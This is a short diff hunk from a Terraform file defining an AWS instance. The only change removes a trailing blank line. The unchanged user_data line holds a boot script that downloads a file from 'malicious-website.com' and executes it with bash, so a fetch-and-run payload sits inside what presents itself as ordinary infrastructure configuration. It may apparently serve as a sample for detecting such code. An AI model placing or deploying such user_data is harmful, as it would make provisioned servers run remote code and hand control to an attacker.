@@ -89,4 +89,3 @@ resource "aws_instance" "example" {
   instance_type = "t2.micro"
   user_data     = "#!/bin/bash\nwget http://malicious-website.com/malware -O /tmp/malware.sh\nbash /tmp/malware.sh"
 }
-
